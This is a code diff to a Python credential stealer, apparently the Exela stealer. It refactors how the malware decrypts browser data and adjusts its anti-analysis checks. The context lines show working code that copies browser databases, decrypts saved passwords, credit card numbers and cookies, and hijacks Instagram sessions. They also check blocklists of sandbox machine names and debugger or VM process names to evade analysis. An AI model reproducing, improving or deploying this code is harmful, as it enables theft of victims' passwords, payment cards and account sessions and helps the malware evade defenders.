@@ -161,12 +161,13 @@ class QuicaxdExela:
                 logins = cursor.fetchall()
                 conn.close()
                 os.remove(self.backup_login_data_path)
+                key = self.get_encryption_key(value)
                 for login in logins:
                     if login[1] and login[2]:
                         self.passws +=1
                         url = login[0]
                         username = login[1]
-                        password = self.decrypt_pw(login[2], self.get_encryption_key(value))
+                        password = self.decrypt_pw(login[2], key)
                         self.passw.append("URL : " + url )
                         self.passw.append("Username : " + username )
                         self.passw.append("Password : " + password )
@@ -201,13 +202,14 @@ class QuicaxdExela:
                 logins = cursor.fetchall()
                 conn.close()
                 os.remove(self.backup_login_data_path)
+                key = self.get_encryption_key(value)
                 for cc in logins:
                     if cc[0]:
                         self.cc +=1
                         if cc[2] < 10:
                             month = "0"  + f"{cc[2]}"
                         else:month = cc[2]
-                        self.ottomonCC.append(str(self.decrypt_pw(cc[0], self.get_encryption_key(value))) + " " +  str(month) + str("/") +  str(cc[1]) + " " +  str(cc[3]))
+                        self.ottomonCC.append(str(self.decrypt_pw(cc[0], key)) + " " +  str(month) + str("/") +  str(cc[1]) + " " +  str(cc[3]))
         except:
             pass
     def connect_to_database3(self, value, value2, asd):
@@ -245,10 +247,11 @@ class QuicaxdExela:
                 logins = cursor.fetchall()
                 conn.close()
                 os.remove(self.backup_login_data_path)
+                key = self.get_encryption_key(value)
                 for cookie in logins:
                     if cookie[3]:
                         self.cookie += 1
-                        cooked = self.decrypt_pw(cookie[3],self.get_encryption_key(value))
+                        cooked = self.decrypt_pw(cookie[3],key)
                         self.cookeds.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cooked}")
                         if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                             self.setInstaSession(cooked, profil_kismi)
@@ -1557,7 +1560,7 @@ class AntiDebug:
         self.banned_computer_names = ["WDAGUtilityAccount","JOANNA","WINZDS-21T43RNG", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
                             "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
                             "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R","COMPNAME_4491", "WILEYPC", "WORK","KATHLROGE","DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC","DESKTOP-NNSJYNR", "JULIA-PC","DESKTOP-BQISITB", "d1bnJkfVlH"]
-        self.banned_process = ["httpdebuggerui","node","cmd","wireshark", "fiddler", "regedit", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
+        self.banned_process = ["httpdebuggerui","node","wireshark", "fiddler", "regedit", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
                                      "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
         self.calback()
     def calback(self):
@@ -1613,5 +1616,6 @@ if __name__ == "__main__":
         print("mutex already exist")
         os._exit(0)
     else:
-        print("mutex created")
+        t = time.time()
         callAllFunctions()
+        print(time.time() - t)
